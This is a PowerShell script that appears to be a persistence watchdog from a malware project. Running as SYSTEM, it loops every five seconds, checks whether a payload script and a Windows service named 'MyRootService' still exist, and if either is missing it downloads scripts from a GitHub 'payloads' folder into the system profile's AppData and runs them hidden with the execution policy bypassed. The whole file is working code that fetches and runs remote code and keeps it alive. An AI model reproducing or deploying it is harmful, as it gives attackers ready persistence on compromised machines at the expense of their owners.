#script must run as admin/SYSTEM
param(
    [string]$rootPath
)
Start-Process powershell.exe -ArgumentList "-Command `"whoami >> C:\whoami2.txt`""
$paths = @(
    "$env:windir\system32\config\systemprofile\AppData\Local"
)

$serviceName = "MyRootService" # change this to the name of the service
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"
$hasRootPathModified=$false
if(($rootPath -eq $null) -or ($rootPath -eq "")){
    $idx = Get-Random -Minimum 0 -Maximum $paths.Length
    $rootPath = $paths[$idx]
    $rootPath = "$rootPath\root.ps1"
    $hasRootPathModified=$true
}

$idx = Get-Random -Minimum 0 -Maximum $paths.Length
$initServicePath = $paths[$idx]
$initServicePath = "$initServicePath\init_service_root.ps1"

function Check-ServiceReg{
    param([string]$path)
    $c = Get-Item -Path $path -ErrorAction SilentlyContinue
    if(-not($c)){
        return $true
    }
    return $false
}

function Check-Service{
    param([string]$name)
    try {
        $d = Get-Service -Name $name -ErrorAction SilentlyContinue
        if(-not($d)){
            return $true
        }
    }
    catch {
        return $false
    }
    return $false
}

while ($true) {
    $regS = Check-ServiceReg -path $regPath
    $serv = Check-Service -name $serviceName

    if(-not(Test-Path -Path $rootPath -PathType Leaf)){
        if(-not($hasRootPathModified)){
            $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
            $rootPath = "$rootPath\root.ps1"
            $hasRootPathModified=$false
        }
        iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/root.ps1" -OutFile $rootPath
        iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_root.ps1" -OutFile $initServicePath
        powershell.exe -ep bypass -noP -w hidden $initServicePath -rootScriptPath $rootPath
    }
    
    elseif($regS -or $serv){
        iwr -uri "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/init_service_root.ps1" -OutFile $initServicePath
        powershell.exe -ep bypass -noP -w hidden $initServicePath -rootScriptPath $rootPath
    }
    Start-Sleep -Seconds 5
}